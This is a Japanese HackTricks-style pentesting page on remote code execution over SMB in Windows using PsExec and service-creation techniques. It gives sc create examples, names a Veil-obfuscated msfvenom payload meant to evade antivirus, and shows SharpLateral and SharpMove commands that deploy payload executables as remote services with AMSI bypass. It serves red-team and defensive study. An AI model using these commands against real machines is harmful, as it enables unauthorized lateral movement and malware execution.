# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## どのように機能するか

プロセスは以下のステップで概説されており、サービスバイナリがどのように操作され、SMBを介してターゲットマシンでリモート実行を達成するかを示しています。

1. **ADMIN$共有にサービスバイナリをSMB経由でコピー**します。
2. **リモートマシン上にサービスを作成**し、バイナリを指します。
3. サービスが**リモートで開始**されます。
4. 終了時に、サービスは**停止され、バイナリは削除**されます。

### **PsExecを手動で実行するプロセス**

msfvenomで作成され、ウイルス対策検出を回避するためにVeilを使用して難読化された実行可能ペイロード「met8888.exe」を仮定すると、以下のステップが取られます。

- **バイナリのコピー**: 実行可能ファイルはコマンドプロンプトからADMIN$共有にコピーされますが、ファイルシステムのどこにでも配置して隠すことができます。
- バイナリをコピーする代わりに、`powershell.exe`や`cmd.exe`のようなLOLBASバイナリを使用して、引数から直接コマンドを実行することも可能です。例: `sc create [ServiceName] binPath= "cmd.exe /c [PayloadCommand]"`
- **サービスの作成**: Windowsの`sc`コマンドを利用して、リモートでWindowsサービスを照会、作成、削除することができ、「meterpreter」という名前のサービスがアップロードされたバイナリを指すように作成されます。
- **サービスの開始**: 最後のステップはサービスを開始することで、バイナリが本物のサービスバイナリでないため、期待される応答コードを返さずに「タイムアウト」エラーが発生する可能性が高いです。このエラーは、バイナリの実行が主な目的であるため、重要ではありません。

Metasploitリスナーを観察すると、セッションが正常に開始されたことがわかります。

[Learn more about the `sc` command](https://technet.microsoft.com/en-us/library/bb490995.aspx).

詳細な手順については、[https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)を参照してください。

- **Windows SysinternalsバイナリPsExec.exe**を使用することもできます：

![](<../../images/image (928).png>)

またはwebddav経由でアクセスできます：
```bash
\\live.sysinternals.com\tools\PsExec64.exe -accepteula
```
- あなたは[**SharpLateral**](https://github.com/mertdas/SharpLateral)を使用することもできます：
```bash
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```
- あなたは[**SharpMove**](https://github.com/0xthirteen/SharpMove)も使用できます:
```bash
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```
- **Impacketの`psexec`と`smbexec.py`**も使用できます。


{{#include ../../banners/hacktricks-training.md}}
